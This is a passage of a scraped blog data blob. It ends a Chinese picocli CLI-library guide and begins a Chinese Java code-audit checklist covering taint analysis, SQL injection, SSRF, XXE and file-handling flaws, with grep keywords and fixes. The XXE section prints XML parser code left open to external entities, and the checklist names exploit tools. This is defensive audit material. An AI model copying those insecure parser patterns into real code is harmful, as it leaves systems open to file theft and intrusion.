= "commit",\n        sortoptions = false,\n        headerheading = "@|bold,underline usage|@:%n%n",\n        synopsisheading = "%n",\n        descriptionheading = "%n@|bold,underline description|@:%n%n",\n        parameterlistheading = "%n@|bold,underline parameters|@:%n",\n        optionlistheading = "%n@|bold,underline options|@:%n",\n        header = "record changes to the repository.",\n        description = "stores the current contents of the index in a new commit " +\n                "along with a log message from the user describing the changes.")\nclass gitcommit { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n> 标记样式不能嵌套，例如：@|bold this @|underline that|@|@将不起作用。您可以通过组合样式来实现相同的目标，例如：@|bold this|@ @|bold，underline that|@将正常工作。\n\n\n# 更多颜色\n\n只有八种预定义的命名颜色，但大多数终端支持256种颜色索引调色板。请参阅用户手册的“更多颜色”部分，以将这些颜色用作前景或背景颜色。\n\n\n\n# 固定元素配色方案\n\npicocli对选项、参数和命令使用默认配色方案。没有注释来修改此配色方案，但可以通过编程和系统属性进行更改。有关详细信息，请参阅用户手册的配色方案部分。\n\n\n# 支持的平台\n\npicocli只会在支持的平台上发布ansi转义代码。这包括大多数unix和linux平台。有关为windows命令控制台添加着色支持的各种选项，请参阅用户手册的windows部分。\n\n\n# 强制开启或关闭ansi\n\n无论平台如何，您都可以强制picocli始终使用ansi代码或永远不使用ansi代码：\n\n * 将系统属性picocli.ansi设置为true强制picocli使用ansi代码；将picocli.ansi设置为false强制picocli不使用ansi代码。对于您的命令行应用程序的用户来说，这可能是一个有用的工具。\n\n * 您可以通过在调用commandline.usage时指定ansi.on或ansi.off，决定以编程方式强制禁用或强制启用ansi转义代码。这覆盖了系统属性picocli.ansi的值。例如：\n\nimport picocli.commandline.help.ansi;\n\napp app = commandline.usage(new app(), system.out, ansi.off, args);\n\n\n1\n2\n3\n\n\n\n# 子命令\n\n\n# 注册子命令\n\n子命令可以以编程或声明方式注册\n\n# 编程方式\n\n子命令可以使用commandline.addsubcommand方法注册。您传递命令和带注解的对象的名称以填充子命令选项。解析器使用指定的名称来识别命令行参数中的子命令。\n\ncommandline commandline = new commandline(new git())\n        .addsubcommand("status",   new gitstatus())\n        .addsubcommand("commit",   new gitcommit())\n        .addsubcommand("add",      new gitadd())\n        .addsubcommand("branch",   new gitbranch())\n        .addsubcommand("checkout", new gitcheckout())\n        .addsubcommand("clone",    new gitclone())\n        .addsubcommand("diff",     new gitdiff())\n        .addsubcommand("merge",    new gitmerge())\n        .addsubcommand("push",     new gitpush())\n        .addsubcommand("rebase",   new gitrebase())\n        .addsubcommand("tag",      new gittag());\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n> 关于自定义类型转换器的注意事项：自定义类型转换器仅注册在自定义类型之前添加的子命令和嵌套子子命令中。为了确保所有子命令都可以使用自定义类型转换器，请在添加子命令后最后注册类型转换器。\n\n# 声明方式\n\n子命令可以声明性地使用@command注释的子命令属性注册。\n\n@command(name = "git", subcommands = {\n    gitstatus.class,\n    gitcommit.class,\n    gitadd.class,\n    gitbranch.class,\n    gitcheckout.class,\n    gitclone.class,\n    gitdiff.class,\n    gitmerge.class,\n    gitpush.class,\n    gitrebase.class,\n    gittag.class\n})\npublic class git { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n当构建新的commandline（new git()）实例时，声明的子命令会自动实例化和添加。\n\n子命令属性中引用的子命令必须具有带有名称属性的@command注释，否则从commandline构造函数中抛出异常。\n\n# 嵌套子命令\n\n子命令可以嵌套到任意深度级别。有关详细信息，请参阅用户手册的嵌套子命令部分。\n\n\n# 解析子命令\n\n对于这个例子，我们假设我们创建了一个别名git来调用我们的java应用程序。这也可以是一个调用我们java程序的脚本或函数：\n\nalias git=\'java picocli.demo$git\'\n\n\n1\n\n\n接下来，我们用以下参数调用我们的命令：\n\ngit --git-dir=/home/rpopma/picocli status -sb -uno\n\n\n1\n\n\n其中git（实际上是java picocli.demo$git）是顶级命令，其次是全局选项和具有自身选项的子命令状态。\n\n设置解析器并解析命令行可能如下所示：\n\npublic static void main(string... args) {\n    // set up the parser\n    commandline commandline = new commandline(new git());\n\n    // add subcommands programmatically (not necessary if the parent command\n    // declaratively registers the subcommands via annotation)\n    commandline.addsubcommand("status",   new gitstatus())\n               .addsubcommand("commit",   new gitcommit())\n                ...\n\n    // invoke the parse method to parse the arguments\n    list<commandline> parsed = commandline.parse(args);\n    handleparseresult(parsed);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ncommandline.parse方法返回一个包含可识别命令的列表。顶级命令（在本例中由git调用的java类）始终是返回列表中的第一个元素。\n\n返回的列表还包含所有匹配的子命令。您的应用程序需要检查此列表，以查看调用了哪些子命令，并采取适当的行动。例如：\n\nprivate void handleparseresult(list<commandline> parsed) {\n    assert parsed.size() == 2 : "1 command and 1 subcommand found"\n\n    assert parsed.get(0).getcommand().getclass() == git.class       : "main command"\n    assert parsed.get(1).getcommand().getclass() == gitstatus.class : "subcommand"\n\n    git git = (git) parsed.get(0).getcommand();\n    assert git.gitdir.equals(new file("/home/rpopma/picocli"));\n\n    gitstatus gitstatus = (gitstatus) parsed.get(1).getcommand();\n    assert  gitstatus.shortformat              : "git status -s"\n    assert  gitstatus.branchinfo               : "git status -b"\n    assert !gitstatus.showignored              : "git status --showignored not specified"\n    assert  gitstatus.mode == gitstatusmode.no : "git status -u=no"\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n从picocli 4.0开始，您可以使用执行方法来减少应用程序中的错误处理和其他样板代码。\n\n\n# @parentcommand注解\n\n在具有子命令的命令行应用程序中，顶级命令的选项通常用作适用于所有子命令的“全局”选项。@parentcommand注释使子命令可以轻松访问其父命令选项：用@parentcommand注释的子命令字段通过引用父命令进行初始化。用户手册有一个示例，展示了如何使用@parentcommand注释。\n\n\n# 子命令的使用帮助\n\n注册子命令后，调用commandline.usage方法将显示一条使用帮助消息，按注册顺序包含所有子命令。例如：\n\nusage: git [-hv] [--git-dir=<gitdir>]\ngit is a fast, scalable, distributed revision control system with an unusually\nrich command set that provides both high-level operations and full access to\ninternals.\n      --git-dir=<gitdir>   set the path to the repository.\n  -h, --help               show this help message and exit.\n  -v, --version            print version information and exit.\n\ncommands:\n\nthe most commonly used git commands are:\n  help      displays help information about the specified command\n  status    show the working tree status.\n  commit    record changes to the repository.\n  add       add file contents to the index.\n  branch    list, create, or delete branches.\n  checkout  checkout a branch or paths to the working tree.\n  clone     clone a repository into a new directory.\n  diff      show changes between commits, commit and working tree, etc.\n  merge     join two or more development histories together.\n  push      update remote refs along with associated objects.\n  rebase    forward-port local commits to the updated upstream head.\n  tag       create, list, delete or verify a tag object signed with gpg.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n列表中子命令的描述取自子命令的第一个标题行，或者，如果子命令没有标题注释，则取自描述。\n\n# 隐藏的子命令\n\n将隐藏属性设置为true的命令不会显示在其父命令的使用帮助消息中。有关详细信息，请参阅用户手册的隐藏子命令部分。\n\n# 帮助子命令\n\npicocli有一个内置的帮助子命令，但如果您有兴趣创建自定义帮助命令，请参阅用户手册的帮助子命令部分。\n\n\n# 重复使用\n\n您可能会发现自己在许多命令行应用程序中定义了相同的选项、参数或命令属性。为了减少重复，picocli支持子类和混合，作为重用此类选项和属性的方法。\n\n重用上述选项和属性的一种方法是扩展类。picocli将走在类层次结构中检查注释，因此在超类上声明的@options、@parameters和@command属性在所有子类中都可用。\n\n命令也可以通过用@mixin注释字段来包含mixin。mixin类中发现的所有picocli注释都添加到带有@mixin注释字段的命令中。例如：\n\n@command(name = "zip", description = "example reuse with @mixin annotation.")\npublic class mycommand {\n\n    // adds the options defined in reusableoptions to this command\n    @mixin\n    private reusableoptions mymixin;\n    ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n用户手册的重用部分有更广泛的示例。\n\n\n# 执行命令\n\n执行命令时，解析命令行是第一步。一个强大的现实世界应用程序需要处理许多场景：\n\n * 用户输入无效：显示描述问题的错误，并显示使用帮助\n\n * 用户请求的使用帮助：显示帮助消息并退出\n\n * 用户请求的版本帮助：显示版本信息和退出\n\n * 以上都不是：运行业务逻辑（可能用于子命令）\n\n * 业务逻辑可能会抛出异常：处理或重新抛出异常\n\n从piocli 4.0起，您可以使用commandline.execute方法，该方法在一行代码中处理上述所有场景：\n\nnew commandline(new myapp()).execute(args);\n\n\n1\n\n\n使用执行方法，应用程序代码可以非常紧凑：\n\n@command(name = "myapp", mixinstandardhelpoptions = true, version = "1.0")\nclass myapp implements callable<integer> {\n\n    @option(names = "-x") int x;\n\n    @override\n    public integer call() { // business logic\n        system.out.printf("x=%s%n", x);\n        return 123; // exit code\n    }\n\n    public static void main(string... args) { // bootstrap the application\n        system.exit(new commandline(new myapp()).execute(args));\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n尽管只有15行长，但这是一个成熟的应用程序，除了-x选项外，还有--help和--version选项。如果用户要求，执行方法将显示使用帮助或版本信息，无效的用户输入将导致有用的错误消息。如果用户输入有效，则调用业务逻辑。最后，执行方法返回一个退出状态代码，如果需要，可用于调用system.exit。\n\n用户手册的diy命令执行部分显示了执行方法可以省略的样板代码示例。\n\n\n# 退出代码\n\n许多命令行应用程序返回退出代码，以表示成功或失败。零通常意味着成功，非零退出代码通常用于错误，但除此之外，每个应用程序的含义不同。\n\npicocli 4.0中引入的commandline.execute方法返回一个int，如果需要，应用程序可以使用此返回值调用system.exit。例如：\n\npublic static void main(string... args) {\n  int exitcode = new commandline(new myapp()).execute(args);\n  system.exit(exitcode);\n}\n\n\n1\n2\n3\n4\n\n\n> 旧版本的picocli有一些有限的退出代码支持，picocli会调用system.exit，但现在不建议使用。\n\n\n# 生成退出代码\n\n实现callable并且添加了@command注解的方法和@command注解的类可以简单地返回int或整数，此值将从commandline.execute返回。例如：\n\n@command(name = "greet")\nclass greet implements callable<integer> {\n    public integer call() {\n        system.out.println("hi");\n        return 1;\n    }\n\n    // define a "shout" subcommand with a @command-annotated method\n    @command\n    int shout() {\n        system.out.println("hi!");\n        return 2;\n    }\n}\n\nassert 1 == new commandline(new greet()).execute();\nassert 2 == new commandline(new greet()).execute("shout");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n使用实现runnable的用户对象的命令可以实现iexitcodegenerator接口来生成退出代码。\n\n\n# 例外退出代码\n\n默认情况下，执行方法成功时返回commandline.exitcode.ok (0)，在runable、callable或命令方法中发生异常时返回commandline.exitcode.software（1），以及无效输入的commandline.exitcode.usage（2）。（根据这个stackoverflow答案，这些是常见的值）。这可以通过@command注释进行自定义。例如：\n\n@command(exitcodeoninvalidinput = 123,\n   exitcodeonexecutionexception = 456)\n\n\n1\n2\n\n\n此外，应用程序可以配置iexitcodeexceptionmapper将特定异常映射到退出代码。\n\n\n# 执行配置\n\n虽然执行方法允许在一行代码中运行cli应用程序，但命令执行的各个步骤都是高度可配置的。以下方法可用于配置执行方法的行为，您可以使用它们来调整命令执行以满足您的需求：\n\n * get/setout\n * get/seterr\n * get/setcolorscheme\n * get/setexecutionstrategy\n * get/setparameterexceptionhandler\n * get/setexecutionexceptionhandler\n * get/setexitcodeexceptionmapper\n\n> 上述方法不适用于（并被忽略）其他入口点，如parse、parseargs、populatecommand、run、call、调用、parsewithhandler和parsewithhandlers。\n\n\n# 处理错误\n\n在内部，执行方法解析指定的用户输入，并填充注释定义的选项和位置参数。当用户指定无效输入时，由iparameterexceptionhandler处理。\n\n解析用户输入后，将调用命令的业务逻辑：运行、调用或@command-annotated方法。当业务逻辑抛出异常时，由iexecutionexceptionhandler处理。\n\n在大多数情况下，默认处理程序就足够了。在用户手册的处理错误部分深入解释了默认处理程序的自定义。\n\n\n# 迁移\n\n旧版本的picocli支持运行、调用、调用和parsewithhandlers方便方法，这些方法类似于执行，但对解析器配置的支持有限，对退出代码的支持有限。从picocli 4.0中，这些方法已被弃用。\n\n用户手册的迁移部分可帮助您将现有代码迁移到新引入的执行api\n\n\n# 追踪\n\npicocli支持解析器跟踪，以方便故障排除。系统属性picocli.trace控制跟踪级别。支持的级别包括off、warn、info和debug。默认跟踪级别为warn。\n\n指定没有值的系统属性-dpicocli.trace将把跟踪级别设置为info。\n\n * debug：显示解析器在命令行解析期间所作决定的详细信息。\n\n * info：显示命令行解析期间发生的事情的高级概述。\n\n * warn：默认值。启用宽松解析时显示警告而不是错误：当多次指定单值选项（commandline.overwrittenoptionsallowed为真）或命令行参数无法匹配为选项或位置参数时（commandline.unmatchedargumentsallowed为真）。\n\n * off：禁止所有跟踪，包括警告。\n\n示例：\n\n# create a custom \'mygit\' command that invokes picocli.demo$git with tracing switched on\nalias mygit=\'java -dpicocli.trace -cp picocli-all.jar picocli.demo$git\'\n\n# invoke our command with some parameters\nmygit --git-dir=/home/rpopma/picocli commit -m "fixed typos" -- src1.java src2.java src3.java\n\n\n1\n2\n3\n4\n5\n\n\n输出：\n\n[picocli info] parsing 8 command line args [--git-dir=/home/rpopma/picocli, commit, -m, "fixed typos", --, src1.java, src2.java, src3.java]\n[picocli info] setting file field \'git.gitdir\' to \'\\home\\rpopma\\picocli\' for option --git-dir\n[picocli info] adding [fixed typos] to list&lt;string> field \'gitcommit.message\' for option -m\n[picocli info] found end-of-options delimiter \'--\'. treating remainder as positional parameters.\n[picocli info] adding [src1.java] to list&lt;string> field \'gitcommit.files\' for args[0..*]\n[picocli info] adding [src2.java] to list&lt;string> field \'gitcommit.files\' for args[0..*]\n[picocli info] adding [src3.java] to list&lt;string> field \'gitcommit.files\' for args[0..*]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 自动补全\n\n基于picocli的应用程序现在可以在bash或zsh unix shell中完成命令行。请参阅java命令行应用程序自动完成手册，了解如何生成为您的应用程序量身定制的自动完成脚本。\n\n\n# 更多\n\n为了保持本快速指南简短（或至少简短），必须遗漏一些东西。如果您感兴趣，这里有一些快速链接：\n\n * picocli in other languages\n * usage help api for customizing the usage help message layout\n * tips & tricks\n * api javadoc',charsets:{cjk:!0},lastUpdated:"2022/04/25, 19:19:43",lastUpdatedTimestamp:1650914383e3},{title:"Java代码审计CheckList",frontmatter:{title:"Java代码审计CheckList",date:"2022-07-26T15:00:00.000Z",permalink:"/sec/codereview/javachecklist",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["代码审计"],tags:["Java","代码审计"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/204.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/00.Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1CheckList.html",relativePath:"02.安全/204.代码审计/00.Java代码审计CheckList.md",key:"v-49770e72",path:"/sec/codereview/javachecklist/",headers:[{level:2,title:"概述",slug:"概述",normalizedTitle:"概述",charIndex:25},{level:3,title:"什么是代码审计？",slug:"什么是代码审计",normalizedTitle:"什么是代码审计？",charIndex:32},{level:3,title:"污点分析原理",slug:"污点分析原理",normalizedTitle:"污点分析原理",charIndex:160},{level:3,title:"代码审计流程",slug:"代码审计流程",normalizedTitle:"代码审计流程",charIndex:874},{level:3,title:"常用工具",slug:"常用工具",normalizedTitle:"常用工具",charIndex:1358},{level:2,title:"基础漏洞审计方式",slug:"基础漏洞审计方式",normalizedTitle:"基础漏洞审计方式",charIndex:1578},{level:3,title:"SQL注入",slug:"sql注入",normalizedTitle:"sql注入",charIndex:289},{level:3,title:"SSRF",slug:"ssrf",normalizedTitle:"ssrf",charIndex:2372},{level:3,title:"XXE",slug:"xxe",normalizedTitle:"xxe",charIndex:3109},{level:3,title:"搜索字符串内容",slug:"搜索字符串内容-3",normalizedTitle:"搜索字符串内容",charIndex:1718},{level:3,title:"任意文件操作",slug:"任意文件操作",normalizedTitle:"任意文件操作",charIndex:6363},{level:3,title:"命令执行",slug:"命令执行",normalizedTitle:"命令执行",charIndex:7417},{level:3,title:"不安全的反序列化",slug:"不安全的反序列化",normalizedTitle:"不安全的反序列化",charIndex:7870},{level:3,title:"URL跳转",slug:"url跳转",normalizedTitle:"url跳转",charIndex:8284},{level:3,title:"硬编码",slug:"硬编码",normalizedTitle:"硬编码",charIndex:8742},{level:3,title:"不安全的加密方式",slug:"不安全的加密方式",normalizedTitle:"不安全的加密方式",charIndex:9036},{level:3,title:"日志伪造",slug:"日志伪造",normalizedTitle:"日志伪造",charIndex:9562},{level:3,title:"敏感信息泄露",slug:"敏感信息泄露",normalizedTitle:"敏感信息泄露",charIndex:9776},{level:3,title:"安全配置错误",slug:"安全配置错误",normalizedTitle:"安全配置错误",charIndex:10218},{level:3,title:"XSS",slug:"xss",normalizedTitle:"xss",charIndex:825},{level:2,title:"业务逻辑漏洞审计方式",slug:"业务逻辑漏洞审计方式",normalizedTitle:"业务逻辑漏洞审计方式",charIndex:10854},{level:3,title:"认证相关",slug:"认证相关",normalizedTitle:"认证相关",charIndex:10948},{level:3,title:"支付相关",slug:"支付相关",normalizedTitle:"支付相关",charIndex:14347},{level:3,title:"权限相关",slug:"权限相关",normalizedTitle:"权限相关",charIndex:14748},{level:3,title:"遗留问题",slug:"遗留问题",normalizedTitle:"遗留问题",charIndex:15184},{level:3,title:"验证码类",slug:"验证码类",normalizedTitle:"验证码类",charIndex:15521},{level:2,title:"三方组件漏洞审计方式",slug:"三方组件漏洞审计方式",normalizedTitle:"三方组件漏洞审计方式",charIndex:15795},{level:2,title:"参考资料",slug:"参考资料",normalizedTitle:"参考资料",charIndex:16156}],excerpt:"<p>好久没更新了，写一篇CheckList。</p>\n",headersStr:"概述 什么是代码审计？ 污点分析原理 代码审计流程 常用工具 基础漏洞审计方式 SQL注入 SSRF XXE 搜索字符串内容 任意文件操作 命令执行 不安全的反序列化 URL跳转 硬编码 不安全的加密方式 日志伪造 敏感信息泄露 安全配置错误 XSS 业务逻辑漏洞审计方式 认证相关 支付相关 权限相关 遗留问题 验证码类 三方组件漏洞审计方式 参考资料",content:'好久没更新了，写一篇CheckList。\n\n\n# 概述\n\n\n# 什么是代码审计？\n\n谁：代码审计值得是具有安全和开发经验的人员\n\n对象：阅读程序源代码或者经过反编译之后的代码\n\n手段：借助自动化代码分析工具或者人工阅读的方式\n\n目的：发现系统代码中存在的安全风险和设计缺陷，引导开发人员修复，保障系统运行安全。\n\n\n# 污点分析原理\n\n污点分析是一种跟踪并分析污点信息在程序中流动的技术。在漏洞分析中通常将污点分析抽象成一个三元组的表示方式<sources,sinks,sanitizers>的形式：\n\n * sources: 污点源，直接引入导致危险发生的不信任数据的位置，以SQL注入为例，id=1存在SQL注入，污点源为id参数；\n * sinks: 污点汇聚点，直接进行危险操作或者隐私泄露到外界的位置，以SQL注入为例，污染汇聚点为executeQuery()相关调用执行SQL语句的位置；\n * sanitizers: 无害化处理，使用转义、过滤、阻断、加密等手段不再对系统安全产生危害的位置，以SQL注入为例，无害化处理指的是SQL语句的过滤位置、或者SQL语句产生结果的判断位置（不完全）。\n\n\n\n污点分析就是分析程序中是否存在未经过无害化处理的污染源通过传播路径到达污点汇聚点，对系统产生危害。污点分析可以分成以下的几个阶段：\n\n 1. 判断列举污点汇聚点；\n 2. 寻找到污染汇聚点对应参数的污点来源；\n 3. 判断从污点源到五点汇聚点是否存在可能的通路；\n 4. 判断是否存在无害化处理、无害化处理是否能够完全处理污点源数据的所有情况。\n\n污点分析是信息流分析技术中的一种实践的技术，广泛应用于静态分析安全测试中，是对人工代码审计的一种抽象。几乎所有的漏洞都可以按照污点分析的方式发现，但是分析的复杂度并不相同。对于SQL等常见的漏洞，污点汇聚点（危险函数）单一且容易发现，相对来说分析起来比较容易；但是对于逻辑漏洞、信息泄露、XSS等漏洞覆盖范围广、产生情况复杂、没有准确的危险函数，白盒发现较为困难且准确度不高。\n\n\n# 代码审计流程\n\n早期的代码审计由于目标系统规模小、代码量较少、代码之间的逻辑调用关系简单清晰，使用人工审计的方式就可以覆盖整个系统了。人工代码审计通常有三种思路：\n\n * 全文通读了解代码每部分的功能以及数据流向，结合具体的功能点发现代码中存在的问题。这种方式全面但是耗时耗力；\n * 危险函数定位法，通过定位上面提到的sinks，找到危险函数之后向上排查，看危险函数数据来源，是否存在无害化处理，这种方式快捷方便，但不全面，对逻辑漏洞没有发现的能力；\n * 对具体的功能点进行建模和审计，根据需求文档或者单一的功能点，分析可能出现的风险项，逐条排查。速度较快，对逻辑漏洞也能很好的把握。排查效果取决于安全人员的威胁建模能力和对目标的了解程度。\n\n由于目标项目在发展的过程中逐渐复杂化以及代码量的指数级增长，系统和系统之间调用关系复杂，人工审计的方式已经无法做到全面的审计。一些对应的工具介入，极大的提高了代码审计人员的工作效率。静态代码审计工具原理发展如下：\n\n * 关键字的匹配\n * 基于AST代码分析\n * 基于IR/CFG的代码分析\n * QL概念\n\n\n# 常用工具\n\n * 用的顺手的编辑器\n   * IDEA、VSCode、eclipse等\n * 反编译工具\n   * Jd-gui、jadx、wJa(有动态调试的功能)等\n * 自动化代码审计工具\n   * checkmarx、Seay、Fortify SCA、找八哥、CODESEC等\n * 其他\n   * CodeQL、soot、dependencyCheck、ysoserial、JNDI-Injection-Exploit等\n\n\n# 基础漏洞审计方式\n\n\n# SQL注入\n\n> 原理：攻击者在可利用的位置插入恶意的SQL语句，使原本的SQL语句产生歧义，从而达到攻击者操纵数据库的目的。\n\n# 代码搜索范围\n\n*、*Mapper.xml、*.java、*.xml(少部分开发人员Mapper文件编写不规范)\n\n# 搜索字符串内容\n\nString sql = "\n@Select\n@Update\n@Delete\n@Insert\n"SELECT\n"UPDATE\n"INSERT\n"DELETE\n${sql}\n${\n.executeQuery(\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 判断依据\n\n 1. 原生JDBC是否存在直接拼接SQL语句（使用+，或者使用StringBUilder append()），未经过预编译；\n 2. Mybatis使用${}；\n 3. Hibernate、JPA默认是经过预编译的，但是如果开发自己编写的SQL语句，也需要进行检查；\n 4. Java是强类型语言，当注入参数为long、int等数字类型时无法进行注入；\n 5. 找到危险函数位置之后，向上搜索，找函数、方法调用位置，直到请求入口（controller层），判断是否存在无害化处理、无害化处理是否严格；\n 6. 注意开发可能设置全局过滤。\n\n# 修复方式\n\n 1. 参数固定为数字类型时，使用数字类型接收，或者转为数字类型；\n 2. 预编译，原生JDBC使用?参数占位，之后使用.preparedStatement，Mybatis使用#{}替换${}；\n 3. 对于Mybatis中无法使用#{}的场景：\n    * like：使用CONCAT(\'%\',#{},\'%\')\n    * in：使用<foreach\n    * order by：代码上做白名单\n 4. 设置过滤器，严格限制传入参数\n\n\n# SSRF\n\n> 原理：SSRF(Server-Side Request Forge, 服务端请求伪造)，攻击者利用漏洞让服务端发起指定的请求。SSRF攻击的目标一般是从外网无法访问的内网系统。\n> \n> Java中的SSRF支持的协议：http、https、file、ftp、mailto、jar、net、doc。在java中SSRF的利用局限较大，一般利用http协议来探测端口，利用file协议读取任意文件。\n\n# 代码搜索范围\n\n*、*.java\n\n# 搜索字符串内容\n\nnew URL(\nURLConnection\nRequest.*.execute\nImageIO.read(\nHttpClient\nClientHttpRequest\nRestTemplate\n.postForObject\n.getForObject\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 判断依据\n\n 1. 该漏洞经常出现在客户端传入文件、图片的URL地址（通常存储在NAS、OSS上）通过URL获取相关的文件或者当前请求需要访问其他请求，请求地址由客户端传入；\n 2. 主要看参数是否可控，是否存在过滤，协议、端口等的限制措施、相关的限制措施是否完善；\n 3. 通常情况下，项目会封装一个用于发起请求的方法，除上述关键字还需要找该方法全部调用位置。\n\n# 修复方式\n\n 1. 当目标请求为域名时，获取域名所对应的IP地址，防止内部解析绕过；\n 2. 设置内网地址黑名单或白名单；\n 3. 设置协议白名单；\n 4. 检查对应的IP地址是否为黑名单地址；\n 5. 禁止302跳转，或者存在302跳转时递归获取跳转的URL，判断是否为黑名单地址；\n 6. 禁止其他非必要的协议。\n\n\n# XXE\n\n> 原理：服务器接收来自攻击者恶意构造的XML数据，在解析XML数据时，没有严格的安全控制措施，导致XML外部实体注入。造成任意文件读取、执行命令、信息泄露等后果。\n\nJava在解析XML时通常有四种方式：DOM、SAX、DOM4J、JDOM。\n\n//1. DocumentBuilder 原生、可回显\nimport javax.xml.parsers.DocumentBuilderFactory;\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocumentBuilder db = dbf.newDocumentBuilder();\nStringReader sr = new StringReader(xml_con);\nInputSource is = new InputSource(sr);\nDocument document = db.parse(is); \n\n//2. saxReader 第三方库\nimport org.dom4j.io.SAXReader;\nSAXReader saxReader = new SAXReader();\nDocument document = saxReader.read(request.getInputStream());\n\n//3. SAXBuilder 第三方库\nimport org.jdom2.input.SAXBuilder;\nSAXBuilder builder = new SAXBuilder();  \nDocument document = builder.build(request.getInputStream());\n\n//4. SAXParserFactory 原生、不可回显\nimport javax.xml.parsers.SAXParserFactory;\nSAXParserFactory factory  = SAXParserFactory.newInstance(); \nSAXParser saxparser = factory.newSAXParser();\nSAXHandler handler = new SAXHandler();  \nsaxparser.parse(request.getInputStream(), handler);\n\n// 其他方式\nimport org.xml.sax.helpers.XMLReaderFactory;\nXMLReader xmlReader = XMLReaderFactory.createXMLReader();\nxmlReader.parse( new InputSource(new StringReader(xml_con)) );\n\nimport org.apache.commons.digester3.Digester;\nDigester digester = new Digester();\ndigester.parse(new StringReader(xml_con)); \n\nimport javax.xml.parsers.DocumentBuilderFactory;\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setXIncludeAware(true);   // 支持XInclude\ndbf.setNamespaceAware(true);  // 支持XInclude\nDocumentBuilder db = dbf.newDocumentBuilder();\nStringReader sr = new StringReader(xml_con);\nInputSource is = new InputSource(sr);\nDocument document = db.parse(is);  // parse xml\n\nSAXParserFactory spf = SAXParserFactory.newInstance();\nSAXParser saxParser = spf.newSAXParser();\nXMLReader xmlReader = saxParser.getXMLReader();\nxmlReader.parse( new InputSource(new StringReader(xml_con)) );\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n# 代码搜索范围\n\n*、*.java\n\n\n# 搜索字符串内容\n\nXML\nXMLReader\nSAXParser\nSAXBuilder\nDocumentBuilder\ndocument.parse(\n\n\n1\n2\n3\n4\n5\n6\n\n\nXML解析常见的包：\n\njavax.xml.parsers.DocumentBuilderFactory;\njavax.xml.parsers.SAXParser\njavax.xml.transform.TransformerFactory\njavax.xml.validation.Validator\njavax.xml.validation.SchemaFactory\njavax.xml.transform.sax.SAXTransformerFactory\njavax.xml.transform.sax.SAXSource\norg.xml.sax.XMLReader\norg.xml.sax.helpers.XMLReaderFactory\norg.dom4j.io.SAXReader\norg.jdom.input.SAXBuilder\norg.jdom2.input.SAXBuilder\njavax.xml.bind.Unmarshaller\njavax.xml.xpath.XpathExpression\njavax.xml.stream.XMLStreamReader\norg.apache.commons.digester3.Digester\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 判断依据\n\n 1. 解析器解析的XML需要外部可控；\n 2. 未禁用DTD或者允许外部实体；\n 3. 大多数项目都会封装一个用于解析XML的方法，因此除上述关键字以外，还需要寻找对应方法的调用位置逐个判断。\n\n# 修复方式\n\nXXE修复方式相对简单，禁用DTDs或者禁止使用外部实体即可。\n\ndbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); //禁用DTDs (doctypes),几乎可以防御所有xml实体攻击\n//如果不能禁用DTDs,可以使用下两项，必须两项同时存在\ndbf.setFeature("http://xml.org/sax/features/external-general-entities", false);      //防止外部普通实体POC 攻击\ndbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);   //防止外部参数实体POC攻击\n\n\n1\n2\n3\n4\n\n\n\n# 任意文件操作\n\n> 原理：任意文件操作包含任意文件下载、删除、上传、目录（文件）遍历、解压缩等。攻击者可以利用上述漏洞恶意操作服务器文件。\n\n# 代码搜索范围\n\n*、*.java\n\n# 搜索字符串内容\n\nnew File(\nString path\nString fileName\nnew FileInputStream(\nnew FileOutputStream(\nnew FileReader\nresponse.setContentType("application/octet-stream; charset=utf-8");\nfile.delete();\nFileUtils.\nnew ZipEntity(\nfile.getName(\n.unzip(\n.mkdirs(\nstream.write(\nsave2File(\nfos、fis.close()\npublic class ZipUtil\nMultipartFile(\nfile.getOriginalFilename(\nupload\ndownload\n上传 // 搜注释\n下载 // 搜注释\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# 判断依据\n\n 1. 未对文件路径、文件名称、文件类型做合理限制，上传文件路径或者文件名称可存在../目录跨越的操作；\n 2. 在解压缩文件时未对压缩包中的文件类型进行限制；\n 3. 未限制上传文件大小；\n 4. 通常情况下在解压缩文件时，开发一般都会创建一个临时目录，解压完成之后将临时文件夹删除，如果临时文件夹名称可以控制，则可以达到任意文件删除的目的；\n 5. 判断文件类型的操作时，开发一般先获取到文件名称，然后使用filename.substring(filename.lastIndexOf("."));获取文件后缀名，如果此处使用filename.indexOf(".")则可能存在绕过可能。\n\n# 修复建议\n\n 1. 判断上传数据包的content-type\n 2. 